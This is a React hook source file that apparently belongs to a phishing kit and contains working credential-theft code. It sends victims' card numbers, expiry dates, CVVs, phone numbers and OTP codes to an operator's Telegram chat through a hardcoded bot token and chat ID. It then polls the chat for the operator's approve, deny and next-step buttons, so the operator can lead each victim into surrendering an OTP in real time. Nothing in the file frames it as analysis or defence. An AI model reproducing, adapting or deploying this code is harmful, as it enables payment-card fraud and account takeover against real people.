// src/hooks/useTelegramBot.js
import { useRef, useEffect } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
const TELEGRAM_CHAT_ID = '5607265678';

export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  const sendToTelegramWithButtons = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve & Continue", callback_data: `approve_${sessionId}` },
            { text: "❌ Deny", callback_data: `deny_${sessionId}` }
          ],
          [
            { text: "💳 View Card Details", callback_data: `card_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  };

  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const cardMessage = `
💳 <b>CARD INFORMATION RECEIVED</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>Card Details:</b>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> ${cardData.cardNumber}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> ${cardData.cvv}

<b>Personal Info:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click the button below to let the user proceed to OTP</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
          ],
          [
            { text: "❌ Deny & Block", callback_data: `deny_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending card details:', error);
      return false;
    }
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}

<b>Status:</b> OTP Verified ✓
      `;

      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  const setupTelegramPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      if (!sessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const [action, sid] = callbackData.split('_');
            
            if (sid === sessionId) {
              if (action === 'approve') onApprove?.();
              else if (action === 'deny') onDeny?.();
              else if (action === 'card') onViewCard?.();
              else if (action === 'next') onNextStep?.();
              
              try {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                  callback_query_id: update.callback_query.id,
                  text: action === 'next' ? "➡️ User can now enter OTP code!" : "✅ Request processed!"
                });
              } catch (callbackError) {
                console.error('Error answering callback:', callbackError);
              }
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  };

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [sessionId]);

  return {
    generateSessionId,
    sendToTelegramWithButtons,
    sendCardDetailsToTelegram,
    sendOtpToTelegram,
    sendSuccessToTelegram
  };
};